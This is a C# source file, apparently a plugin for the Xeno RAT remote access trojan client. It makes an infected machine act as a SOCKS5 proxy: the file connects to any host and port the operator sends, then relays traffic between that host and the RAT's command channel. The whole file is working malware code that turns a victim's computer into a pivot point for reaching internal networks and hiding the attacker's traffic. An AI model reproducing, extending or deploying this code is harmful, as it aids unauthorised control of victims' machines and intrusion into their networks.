using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Remoting.Messaging;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using xeno_rat_client;

namespace Plugin
{
    public class Main
    {
        public async Task Run(Node node) 
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            while (node.Connected()) 
            {
                try
                {
                    byte[] id = await node.ReceiveAsync();
                    Console.WriteLine(id==null);
                    Console.WriteLine("a");
                    if (id != null)
                    {
                        int nodeid = node.sock.BytesToInt(id);
                        Node tempnode = null;
                        foreach (Node i in node.Parent.subNodes)
                        {
                            if (i.SetId == nodeid)
                            {
                                await node.SendAsync(new byte[] { 1 });
                                tempnode = i;
                                break;
                            }
                        }
                        if (tempnode == null)
                        {
                            await node.SendAsync(new byte[] { 0 });
                            continue;
                        }
                        node.AddSubNode(tempnode);
                        new Socks5Handler(tempnode).Start();
                    }
                    else
                    {
                        break;
                    }
                }
                catch 
                {
                    break;
                }
            }
            node.Disconnect();
        }
    }

    class Socks5Handler
    {
        Node subnode;
        public Socks5Handler(Node subnode) 
        { 
            this.subnode = subnode;
        }

        private Socket CreateSocket(int TIMEOUT_SOCKET)
        {
            try
            {
                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, TIMEOUT_SOCKET);
                return sock;
            }
            catch (SocketException ex)
            {
                Console.WriteLine("Failed to create socket: {0}", ex.Message);
                return null;
            }
        }

        private async Task DisconnectSockAsync(Socket sock) 
        {
            try
            {
                if (sock != null)
                {
                    await Task.Delay(10);
                    await Task.Factory.FromAsync(sock.BeginDisconnect, sock.EndDisconnect, true, null);
                }
            }
            catch
            {
                sock?.Close(0);
            }
        }

        public async Task Start() 
        {
            try
            {
                byte[] OK = new byte[] { 1 };
                byte[] timoutErr = new byte[] { 2 };
                byte[] hostUnreachableErr = new byte[] { 3 };
                byte[] GeneralErr = new byte[] { 4 };


                byte[] dest_addr_bytes = await subnode.ReceiveAsync();
                byte[] port_bytes = await subnode.ReceiveAsync();
                byte[] timeout_bytes = await subnode.ReceiveAsync();

                int port = subnode.sock.BytesToInt(port_bytes);
                int timeout = subnode.sock.BytesToInt(timeout_bytes);
                string dest_addr = Encoding.UTF8.GetString(dest_addr_bytes);

                Socket remote_socket = CreateSocket(timeout);
                try
                {
                    await remote_socket.ConnectAsync(dest_addr, port);
                }
                catch (SocketException ex)
                {
                    if (ex.SocketErrorCode == SocketError.TimedOut)
                    {
                        await subnode.SendAsync(timoutErr);
                        await DisconnectSockAsync(remote_socket);
                        subnode.Disconnect();
                        return;
                    }
                    else if (ex.SocketErrorCode == SocketError.HostUnreachable)
                    {
                        await subnode.SendAsync(hostUnreachableErr);
                        await DisconnectSockAsync(remote_socket);
                        subnode.Disconnect();
                        return;
                    }
                    else
                    {
                        await subnode.SendAsync(GeneralErr);
                        await DisconnectSockAsync(remote_socket);
                        subnode.Disconnect();
                        return;
                    }
                }
                await subnode.SendAsync(OK);

                IPEndPoint rsock_info = ((IPEndPoint)remote_socket.LocalEndPoint);

                byte[] rsock_addr = rsock_info.Address.GetAddressBytes();
                byte[] rsock_port = new byte[] { (byte)(rsock_info.Port / 256), (byte)(rsock_info.Port % 256) };
                await subnode.SendAsync(rsock_addr);
                await subnode.SendAsync(rsock_port);

                await RecvSendLoop(remote_socket, subnode, 4096);
                await DisconnectSockAsync(remote_socket);
                subnode.Disconnect();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        private async Task RecvSendLoop(Socket remote_socket, Node subnode, int bufferSize)
        {
            while (remote_socket.Connected && subnode.Connected())
            {
                try
                {
                    await Task.WhenAny(
                           Task.Run(() => remote_socket.Poll(1000, SelectMode.SelectRead)),
                           Task.Run(() => subnode.sock.sock.Poll(1000, SelectMode.SelectRead))
                       );
                    if (remote_socket.Available > 0)
                    {
                        byte[] buffer = new byte[bufferSize];
                        int bytesRead = await remote_socket.ReceiveAsync(new ArraySegment<byte>(buffer), SocketFlags.None);
                        if (bytesRead == 0)
                        {
                            return;
                        }

                        await subnode.SendAsync(buffer.Take(bytesRead).ToArray());

                    }

                    if (subnode.sock.sock.Available > 0)
                    {
                        byte[] data = await subnode.ReceiveAsync();
                        if ((await remote_socket.SendAsync(new ArraySegment<byte>(data), SocketFlags.None)) == 0)
                        {
                            return;
                        }
                    }
                    await Task.Delay(100);
                }
                catch 
                {
                    return;
                }
            }

        }


    }

    public static class Socks5Const
    {
        public enum AuthMethod : byte
        {
            NoAuthenticationRequired = 0x00,
            GSSAPI = 0x01,
            UsernamePassword = 0x02,
            NoAcceptableMethods = 0xFF
            // '\x03' to '\x7F' IANA ASSIGNED
            // '\x80' to '\xFE' RESERVED FOR PRIVATE METHODS
        }

        public enum Command : byte
        {
            Connect = 0x01,
            Bind = 0x02,
            UdpAssociate = 0x03
        }

        public enum AddressType : byte
        {
            IPv4 = 0x01,
            DomainName = 0x03,
            IPv6 = 0x04
        }

        public enum Reply : byte
        {
            OK = 0x00,                       // succeeded
            Failure = 0x01,                  // general SOCKS server failure
            NotAllowed = 0x02,               // connection not allowed by ruleset
            NetworkUnreachable = 0x03,       // Network unreachable
            HostUnreachable = 0x04,          // Host unreachable
            ConnectionRefused = 0x05,        // Connection refused
            TtlExpired = 0x06,               // TTL expired
            CommandNotSupported = 0x07,      // Command not supported
            AddressTypeNotSupported = 0x08   // Address type not supported
        }
    }


}
